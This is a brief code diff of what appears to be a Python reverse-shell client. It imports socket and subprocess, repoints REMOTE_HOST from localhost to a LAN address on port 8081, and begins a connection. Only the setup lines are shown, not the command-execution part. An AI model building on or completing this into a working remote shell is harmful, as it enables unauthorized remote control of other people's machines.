@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
+REMOTE_HOST = '192.168.0.153' 
 REMOTE_PORT = 8081 # 2222
 client = socket.socket()
 print("[-] Connection Initiating...")
